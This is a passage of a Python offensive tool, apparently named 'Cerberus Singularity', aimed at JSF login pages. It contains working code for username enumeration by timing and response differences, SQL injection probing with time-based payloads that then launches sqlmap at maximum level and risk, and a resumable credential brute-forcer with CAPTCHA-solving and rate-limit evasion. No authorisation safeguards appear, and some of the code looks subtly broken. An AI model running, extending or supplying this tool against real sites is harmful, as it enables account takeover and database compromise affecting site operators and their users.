    logger.info(f"Enum Length Avg: Valid={avg_len_valid:.2f}, Invalid={avg_len_invalid:.2f}")

    # Content similarity with DOM differencing (conceptual)
    # If Selenium is enabled, capture the DOM for valid/invalid failures
    content_valid = ""
    content_invalid = ""
    if SELENIUM_ENABLED:
        try:
            driver_valid = webdriver.Chrome(service=ChromeService(DriverManager().install()), options=ChromeOptions()); await asyncio.to_thread(driver_valid.get, LOGIN_URL)
            # Perform a "valid" login attempt that results in failure, then get DOM
            # Placeholder: Assume JSF_PARAMS['initial_recon_raw_html'] represents a failed valid login
            content_valid = await asyncio.to_thread(lambda: driver_valid.execute_script("return document.documentElement.outerHTML"))()
            await asyncio.to_thread(driver_valid.quit)

            driver_invalid = webdriver.Chrome(service=ChromeService(DriverManager().install()), options=ChromeOptions()); await asyncio.to_thread(driver_invalid.get, LOGIN_URL)
            # Perform an "invalid" login attempt that results in failure, then get DOM
            content_invalid = await asyncio.to_thread(lambda: driver_invalid.execute_script("return document.documentElement.outerHTML"))()
            await asyncio.to_thread(driver_invalid.quit)

            # Perform DOM diffing here (e.g., check for subtle class changes, hidden elements, etc.)
            # This would require a dedicated DOM diffing library or custom logic
            # e.g., if "element_changed_text" in diff:
            #   JSF_PARAMS['user_unknown_indicator'] = "dom-changed-text" 
            logger.info("Selenium-based DOM content comparison performed (conceptual).")

        except Exception as e:
            logger.warning(f"DOM differencing failed: {e}")
            # Fallback to direct HTML content
            sample_response_valid_html_resp = await attempt_login_single(aiohttp_session, test_user_valid_candidate, test_pass, await fetch_login_page_details(aiohttp_session, proxy_config, no_ssl_verify=no_ssl_verify), proxy_config, no_ssl_verify=no_ssl_verify)
            sample_response_invalid_html_resp = await attempt_login_single(aiohttp_session, test_user_invalid_candidate, test_pass, await fetch_login_page_details(aiohttp_session, proxy_config, no_ssl_verify=no_ssl_verify), proxy_config, no_ssl_verify=no_ssl_verify)
            content_valid = await sample_response_valid_html_resp[3].text() if sample_response_valid_html_resp[3] else ""
            content_invalid = await sample_response_invalid_html_resp[3].text() if sample_response_invalid_html_resp[3] else ""
    else: # If Selenium not enabled, fallback to original Aiohttp fetch
        sample_response_valid_html_resp = await attempt_login_single(aiohttp_session, test_user_valid_candidate, test_pass, await fetch_login_page_details(aiohttp_session, proxy_config, no_ssl_verify=no_ssl_verify), proxy_config, no_ssl_verify=no_ssl_verify)
        sample_response_invalid_html_resp = await attempt_login_single(aiohttp_session, test_user_invalid_candidate, test_pass, await fetch_login_page_details(aiohttp_session, proxy_config, no_ssl_verify=no_ssl_verify), proxy_config, no_ssl_verify=no_ssl_verify)
        content_valid = await sample_response_valid_html_resp[3].text() if sample_response_valid_html_resp[3] else ""
        content_invalid = await sample_response_invalid_html_resp[3].text() if sample_response_invalid_html_resp[3] else ""

    content_similarity = FUZZ_FUNC(content_valid, content_invalid) # Use fuzzy match on full HTML
    logger.info("Content similarity (fuzzy): {:.2f}%".format(content_similarity))


    # Bayesian-like Decision for Enumeration:
    if content_similarity < JSF_PARAMS['fuzzy_threshold']:
        JSF_PARAMS['user_unknown_indicator'] = "content-based-distinct"; logger.info("Significant content difference detected.")
    elif p_value < 0.0001 and abs(mean_time_valid - mean_time_invalid) > 0.05: # Even tighter p-value, 50ms delta
        JSF_PARAMS['user_unknown_indicator'] = "timing-based"; logger.info("Statistically highly significant timing difference detected.")
        JSF_PARAMS['enum_timing_delta_mean'] = mean_time_valid - mean_time_invalid; JSF_PARAMS['enum_timing_delta_std_valid'] = std_time_valid; JSF_PARAMS['enum_timing_delta_std_invalid'] = std_time_invalid
    elif abs(avg_len_valid - avg_len_invalid) > 50:
        JSF_PARAMS['user_unknown_indicator'] = "length-based"; logger.info("Significant response length difference detected.")

    if JSF_PARAMS['user_unknown_indicator']:
        logger.info(f"Username enumeration strategy activated: {JSF_PARAMS['user_unknown_indicator']}.")
    else:
        logger.info("No clear username enumeration mechanism detected.")

# --- SQLi Detection ---
async def run_sqli_detection(aiohttp_session, proxy_config, threads, conn_db_type=None, no_ssl_verify=False):
    logger.info("Starting intelligent SQL Injection detection...")
    found_vulnerability = False
    
    all_sqli_payloads_to_test = []
    all_sqli_payloads_to_test.extend(SQLI_PAYLOADS['detection']['general'])

    db_types_to_consider = [conn_db_type] if conn_db_type and conn_db_type != 'any' else SQLI_PAYLOADS['time_based'].keys()
    for db_type in db_types_to_consider:
        if db_type in SQLI_PAYLOADS['time_based']: all_sqli_payloads_to_test.append(SQLI_PAYLOADS['time_based'][db_type].format(delay=5))

    # Prepare sqlmap request file (now stores the request structure that will be fuzzed)
    # The actual payload injection for sqlmap is done by sqlmap based on '*'
    raw_request_content = f"POST {urlparse(LOGIN_URL).path} HTTP/1.1\r\n"
    headers_for_sqlmap_file = get_dynamic_headers_aiohttp()
    headers_for_sqlmap_file['Host'] = urlparse(LOGIN_URL).netloc
    for h, v in headers_for_sqlmap_file.items(): raw_request_content += f"{h}: {v}\r\n"
    raw_request_content += "\r\n"
    # Mark parameter for injection, e.g., 'username=injected_val*&password=test'
    # Build a sample post data, but only include the injectable field for sqlmap
    dummy_post_data = await build_jsf_post_data('__INJECT_HERE__*', 'dummy_pass', await fetch_login_page_details(aiohttp_session, proxy_config, no_ssl_verify=no_ssl_verify), None)
    raw_request_content += requests.compat.urlencode(dummy_post_data)
    
    JSF_PARAMS['sqli_detection_raw_request'] = raw_request_content # Store the raw request
    sample_request_file = "sqlmap_request.txt"
    with open(sample_request_file, 'w') as f: f.write(raw_request_content)
    logger.info(f"Sample request for sqlmap saved to {sample_request_file}")

    tasks = []
    for payload in all_sqli_payloads_to_test:
        # Create requests that mimic dynamic payload generation, not just in username field
        # This is where a dedicated fuzzer would shine, generating XML/JSON/etc.
        tasks.append(asyncio.create_task(attempt_login_single(aiohttp_session, payload.replace('__INJECT_HERE__', ''), "any_password", await fetch_login_page_details(aiohttp_session, proxy_config, no_ssl_verify=no_ssl_verify), proxy_config, no_ssl_verify=no_ssl_verify)))
    
    for task in async_tqdm(tasks, desc="SQLi Detection"):
        user_payload_passed, pwd_tried, is_success, response_obj, duration = await task
        response_text = await response_obj.text() if response_obj else ""

        if is_success:
            logger.critical(f"[!!! DIRECT SQLI BYPASS DETECTED !!!] Payload: '{user_payload_passed[:50]}...' bypassed login!")
            JSF_PARAMS['sqli_detection_payload_type'] = 'bypass'; JSF_PARAMS['sqli_injection_point'] = 'username_field'
            found_vulnerability = True; break

        delay_payload_matched = False
        for db_key, tmpl in SQLI_PAYLOADS['time_based'].items():
            if tmpl.format(delay=5) in user_payload_passed: delay_payload_matched = True; break

        if delay_payload_matched and duration > 4.5:
            JSF_PARAMS['db_type'] = next((db_key for db_key, tmpl in SQLI_PAYLOADS['time_based'].items() if tmpl.format(delay=5) in user_payload_passed), 'unknown')
            logger.critical(f"[!!! TIME-BASED SQLI DETECTED !!!] Payload: '{user_payload_passed[:50]}...' caused significant delay ({duration:.2f}s). Inferred DB: {JSF_PARAMS['db_type']}!");
            JSF_PARAMS['sqli_detection_payload_type'] = 'time_based'; JSF_PARAMS['sqli_injection_point'] = 'username_field'
            found_vulnerability = True; break
        
        common_db_errors = ['sql_exception', 'syntax error', 'mysql_fetch_array', 'odbc_exec', 'ORA-', 'pg_query', 'error in your SQL syntax', 'Warning: PDOStatement::execute']
        if response_obj and any(kw in response_text.lower() for kw in common_db_errors) and response_obj.status != 200:
            logger.critical(f"[!!! ERROR-BASED SQLI DETECTED !!!] Payload: '{user_payload_passed[:50]}...' caused a database error. Check response for details.")
            JSF_PARAMS['sqli_detection_payload_type'] = 'error_based'; JSF_PARAMS['sqli_injection_point'] = 'username_field'
            found_vulnerability = True; break

    if found_vulnerability:
        await asyncio.to_thread(call_sqlmap, LOGIN_URL, sample_request_file, proxy_config, level=5, risk=3, sqlmap_args=['--level=5', '--risk=3']) # Fine-tune sqlmap args
        found_credential_or_bypass.set() # Signal
    else: logger.info("SQL Injection detection finished. No obvious vulnerabilities found."); return False
    return True

# --- BRUTE FORCE ---
async def run_brute_force(aiohttp_session, proxy_config, threads, username_wordlist_path, password_wordlist_path, no_ssl_verify=False, human_captcha=False, captcha_api_key=None):
    logger.info("Starting Brute-Force Attack...")
    
    try:
        with open(username_wordlist_path, 'r') as f: usernames = [line.strip() for line in f if line.strip()]
        with open(password_wordlist_path, 'r') as f: passwords = [line.strip() for line in f if line.strip()]
    except FileNotFoundError as e: logger.fatal(f"Wordlist not found: {e}."); sys.exit(1)

    logger.info(f"Loaded {len(usernames)} usernames and {len(passwords)} passwords.")

    found_credential = None
    target_usernames = usernames 

    captcha_token = None
    if JSF_PARAMS['captcha_present']:
        logger.info("CAPTCHA detected, trying to obtain a token for brute-force...")
        current_page_html_response = await (await aiohttp_session.get(LOGIN_URL, ssl=(not no_ssl_verify), proxy=proxy_config['https'])).text()
        captcha_token = await provide_captcha_solution(current_page_html_response, captcha_api_key, human_captcha, aiohttp_session)
        if not captcha_token:
            logger.error("Failed to get CAPTCHA token. Brute-force likely to fail without it.")
            logger.warning("Aborting brute-force due to CAPTCHA."); return None
        elif JSF_PARAMS['captcha_type'] == 'image_general':
             logger.info("Image CAPTCHA solved, assuming token is correct and input field name is 'captcha_response'.")

    # Resume from checkpoint if available
    processing_usernames = usernames; processing_passwords = passwords
    if JSF_PARAMS['last_brute_force_attempt']:
        last_attempt = JSF_PARAMS['last_brute_force_attempt']
        logger.info(f"Resuming brute-force from: {last_attempt['username']}:{last_attempt['password']}")
        try:
            start_user_idx = usernames.index(last_attempt['username'])
            start_pass_idx = passwords.index(last_attempt['password'])
            
            processing_usernames = usernames[start_user_idx:]
            # If all passwords for this user were processed in the last session, skip to next user
            if start_pass_idx + 1 >= len(passwords) and start_user_idx + 1 < len(usernames):
                 processing_usernames = usernames[start_user_idx + 1:]
                 processing_passwords = passwords # Reset password list for next user
            else:
                 # Start from the next password for the current user
                 processing_passwords = passwords[start_pass_idx + 1:] 

        except ValueError:
            logger.warning("Last checkpoint credentials not found in wordlists. Starting from beginning.")
            processing_usernames = usernames; processing_passwords = passwords
    
    if JSF_PARAMS['user_unknown_indicator']: 
        logger.info("Performing username enumeration for efficiency...")
        valid_users = []
        enum_tasks = []
        for user in processing_usernames:
            if found_credential_or_bypass.is_set(): break
            enum_tasks.append(asyncio.create_task(attempt_login_single(aiohttp_session, user, "nonexistentpass" + str(random.randint(1,99999)), await fetch_login_page_details(aiohttp_session, proxy_config, no_ssl_verify=no_ssl_verify), proxy_config, no_ssl_verify=no_ssl_verify, captcha_token=captcha_token)))
        
        for task_future in async_tqdm(asyncio.as_completed(enum_tasks), total=len(enum_tasks), desc="Enumerating Users"):
            user, _, is_success, response_obj, duration = await task_future
            if not is_success and response_obj:
                is_this_user_unknown = False
                response_text = await response_obj.text()

                if JSF_PARAMS['user_unknown_indicator'] == "timing-based":
                    # Simpler comparison for a single user's likely type after statistical baseline is established
                    # If this user's 'duration' is far from the 'invalid' mean within the combined STD of both valid/invalid types
                    if abs(duration - JSF_PARAMS['enum_timing_delta_mean']) > (JSF_PARAMS['enum_timing_delta_std_valid'] + JSF_PARAMS['enum_timing_delta_std_invalid']) / 2 * 2 : # More than 2 std dev difference from the mean enum behaviour
                        is_this_user_unknown = False # Likely a valid user
                    else: is_this_user_unknown = True
                
                elif JSF_PARAMS['user_unknown_indicator'] == "content-based-distinct" :
                    # Check if response text is *similar* to the known "invalid user" error. If not, it might be a valid user.
                    if FUZZ_FUNC(response_text, JSF_PARAMS['initial_recon_raw_html']) > JSF_PARAMS['fuzzy_threshold']: is_this_user_unknown = True
                
                elif JSF_PARAMS['user_unknown_indicator'] == "length-based":
                    if abs(len(response_text) - np.mean(JSF_PARAMS['response_lengths']['invalid_user_fail'])) < 10: is_this_user_unknown = True
                
                if not is_this_user_unknown:
                    valid_users.append(user); logger.info(f"[ENUM] Found valid username: {user}")
        
        if valid_users: target_usernames = valid_users; logger.info(f"Identified {len(valid_users)} valid usernames. Proceeding with targeted brute-force.")
        else: logger.warning("No valid usernames enumerated. Proceeding with full username list."); target_usernames = usernames

    brute_force_tasks = []
    
    # Generate tasks considering resume point for processed_passwords only for the first specific user after resume
    actual_passwords_for_target_users = {}
    is_resumed_user_found = False
    
    for u_idx, user in enumerate(target_usernames):
        if JSF_PARAMS['last_brute_force_attempt'] and user == JSF_PARAMS['last_brute_force_attempt']['username'] and not is_resumed_user_found:
            last_pass_idx = passwords.index(JSF_PARAMS['last_brute_force_attempt']['password'])
            actual_passwords_for_target_users[user] = passwords[last_pass_idx + 1:]
            is_resumed_user_found = True
        else:
            actual_passwords_for_target_users[user] = passwords # Full list for subsequent users

    for user in target_usernames:
        for pwd in actual_passwords_for_target_users[user]:
            if found_credential_or_bypass.is_set(): break
            brute_force_tasks.append(asyncio.create_task(attempt_login_single(aiohttp_session, user, pwd, await fetch_login_page_details(aiohttp_session, proxy_config, no_ssl_verify=no_ssl_verify), proxy_config, captcha_token=captcha_token, no_ssl_verify=no_ssl_verify)))
            # Checkpoint only after a batch of tasks completed to reduce I/O overhead
            if JSF_PARAMS['checkpoint_counter'] % JSF_PARAMS['checkpoint_frequency'] == 0:
                JSF_PARAMS['last_brute_force_attempt'] = {'username': user, 'password': pwd}
                save_checkpoint(JSF_PARAMS) 
        if found_credential_or_bypass.is_set(): break
    
    # Final checkpoint after all tasks generated
    JSF_PARAMS['last_brute_force_attempt'] = {'username': target_usernames[-1], 'password': passwords[-1]} # Or last actually processed
    save_checkpoint(JSF_PARAMS)

    for task_future in async_tqdm(asyncio.as_completed(brute_force_tasks), total=len(brute_force_tasks), desc="Brute-forcing"):
        if found_credential_or_bypass.is_set(): break
        user_attempt, pwd_attempt, is_success, response_obj, duration = await task_future
        
        if is_success:
            logger.critical(f"[!!! CRACKED !!!] Credentials found: {user_attempt}:{pwd_attempt}")
            found_credential = (user_attempt, pwd_attempt)
            found_credential_or_bypass.set()
            break
        elif JSF_PARAMS['rate_limit_detected']:
            await asyncio.sleep(JSF_PARAMS['dynamic_rate_limit_delay'] * random.uniform(0.8, 1.2))

        logger.debug(f"Attempt failed for {user_attempt}:{pwd_attempt} (took {duration:.2f}s). Status: {response_obj.status if response_obj else 'No response'}")
        
    if not found_credential: logger.info("Brute-force attack finished. No credentials found.")
    return found_credential

# --- MAIN EXECUTION ---
async def async_main(args):
    global LOGIN_URL
    LOGIN_URL = args.url

    if args.verbose: logger.setLevel(logging.DEBUG)
    if args.no_ssl_verify: logger.warning("SSL verification is disabled. INSECURE.")

    if args.captcha_api_key: os.environ['CAPTCHA_API_KEY'] = args.captcha_api_key

    JSF_PARAMS['fuzzy_threshold'] = args.fuzzy_threshold
    if args.success_indicators: JSF_PARAMS['success_indicators'] = args.success_indicators
    if args.failure_indicators: JSF_PARAMS['failure_indicators'] = args.failure_indicators
    JSF_PARAMS['checkpoint_frequency'] = args.checkpoint_frequency
    
    proxy_config = get_proxy_config(args.proxy)
    
    # Load checkpoint right at the start if resuming
    if args.resume:
        loaded_params = load_checkpoint()
        if loaded_params:
            JSF_PARAMS.update(loaded_params)
            logger.info("Successfully loaded checkpoint data.")
        else:
            logger.warning("No valid checkpoint found or --resume specified. Starting fresh.")
            args.resume = False

    async with aiohttp.ClientSession() as aiohttp_session:
        initial_viewstate= await fetch_login_page_details(aiohttp_session, proxy_config, use_headless=args.headless, no_ssl_verify=args.no_ssl_verify)

        if not initial_viewstate: logger.fatal("Initial reconnaissance failed. Exiting."); sys.exit(1)
        
        if not JSF_PARAMS['success_indicators']: JSF_PARAMS['success_indicators']=['Welcome', 'Dashboard', '/home', 'logout']
        if not JSF_PARAMS['failure_indicators']: JSF_PARAMS['failure_indicators']=['Invalid', 'Error', 'Failed', 'Incorrect', 'Login failed']

        # sqlmap customization arguments
        sqlmap_custom_args = []
        if args.sqlmap_level: sqlmap_custom_args.extend(['--level', str(args.sqlmap_level)])
        if args.sqlmap_risk: sqlmap_custom_args.extend(['--risk', str(args.sqlmap_risk)])
        if args.sqlmap_target: sqlmap_custom_args.extend(['--target', args.sqlmap_target])

        if args.mode in ['all', 'sqli'] and not found_credential_or_bypass.is_set():
            sqli_success = await run_sqli_detection(aiohttp_session, proxy_config, args.threads, args.db_type, no_ssl_verify=args.no_ssl_verify)
            if sqli_success: logger.critical("SQL Injection successfully exploited. Mission accomplished!"); sys.exit(0)

        if args.mode in ['all', 'brute'] and not found_credential_or_bypass.is_set():
            await conduct_username_enumeration(aiohttp_session, proxy_config, args.threads, no_ssl_verify=args.no_ssl_verify)
            cracked_creds = await run_brute_force(aiohttp_session, proxy_config, args.threads, args.userlist, args.passlist, no_ssl_verify=args.no_ssl_verify, human_captcha=args.human_captcha, captcha_api_key=args.captcha_api_key)
            if cracked_creds: logger.critical(f"Final Result: Credentials cracked: {cracked_creds[0]}:{cracked_creds[1]}"); sys.exit(0)
            else: logger.info("Brute-force finished. No credentials found.")

    logger.info("Cerberus Singularity mission complete.")

def main():
    parser = argparse.ArgumentParser(description="Cerberus Singularity: The Sentient Nexus.", formatter_class=argparse.ArgumentDefaultsHelpFormatter)
    parser.add_argument('-u', '--url', required=True, help='The full URL to the JSF login page (e.g., https://example.com/Login.jsf)')
    parser.add_argument('-ul', '--userlist', default=DEFAULT_USERNAME_WORDLIST, help=f'Path to the username wordlist')
    parser.add_argument('-pl', '--passlist', default=DEFAULT_PASSWORD_WORDLIST, help=f'Path to the password wordlist')
    parser.add_argument('-t', '--threads', type=int, default=5, help='Number of concurrent threads for attacks')
    parser.add_argument('-p', '--proxy', help='HTTP/S proxy to use (e.g., http://127.0.0.1:8080)')
    parser.add_argument('-c', '--config', help='Path to a JSON configuration file.')
    parser.add_argument('--no-ssl-verify', action='store_true', help='Disable SSL verification (use with caution).')
    parser.add_argument('--headless', action='store_true', help='Use headless browser for initial recon (for JavaScript rendered content). Requires Selenium).')
    parser.add_argument('--fuzzy-threshold', type=int, default=80, help='Fuzzy matching threshold for indicators (0-100).')
    parser.add_argument('--success-indicators', nargs='+', help='List of custom success indicator strings.')
    parser.add_argument('--failure-indicators', nargs='+', help='List of custom failure indicator strings.')
    parser.add_argument('--db-type', choices=['mysql', 'mssql', 'postgresql', 'oracle', 'any'], default='any', help='Specify database type for time-based SQLi (or "any" for all).')
    parser.add_argument('--mode', choices=['all', 'sqli', 'brute'], default='all', help='Attack mode: "sqli" for SQLi only, "brute" for brute-force only, "all" for both.')
    parser.add_argument('--captcha-api-key', help='API key for CAPTCHA solving service (e.g., 2Captcha, Anti-Captcha). Sets environment variable.')
    parser.add_argument('--human-captcha', action='store_true', help='Enable human interaction for CAPTCHA solving if API fails or is not used.')
    parser.add_argument('--resume', action='store_true', help='Resume attack from last checkpoint found.')
    parser.add_argument('--checkpoint-frequency', type=int, default=100, help='Frequency (number of attempts) to save checkpoint.')
    # sqlmap customization arguments
    parser.add_argument('--sqlmap-level', type=int, default=None, help='sqlmap level argument (overrides default).')
    parser.add_argument('--sqlmap-risk', type=int, default=None, help='sqlmap risk argument (overrides default).')
    parser.add_argument('--sqlmap-target', help='sqlmap --target argument (e.g., if you want to use a specific URL for sqlmap).')
    parser.add_argument('-v', '--verbose', action='store_true', help='Enable verbose output for debugging.')

    args = parser.parse_args()

    if args.config:
        try:
            with open(args.config, 'r') as f:
                config = json.load(f)
            for key, value in config.items():
                if hasattr(args, key) and getattr(args, key) is parser.get_default(key):
                     setattr(args, key, value)
        except (FileNotFoundError, json.JSONDecodeError) as e:
            logger.fatal(f"Error loading config file: {e}")
            sys.exit(1)

    # Initial loading of checkpoint for main()
    # It must be loaded before async_main to correctly set global JSF_PARAMS
    if args.resume:
        loaded_params = load_checkpoint()
        if loaded_params:
            for key, value in loaded_params.items():
                # For basic types, overwrite unless already given as command-line arg (argparse default check)
                if not (hasattr(args, key) and getattr(args, key) is not parser.get_default(key)):
                    JSF_PARAMS[key] = value
            logger.info("Successfully loaded checkpoint data for initial state.")
        else:
            logger.warning("No valid checkpoint found to resume from. Starting fresh.")
            args.resume = False # Ensure subsequent logic treats it as fresh start

    asyncio.run(async_main(args))

if __name__ == '__main__':
    main()
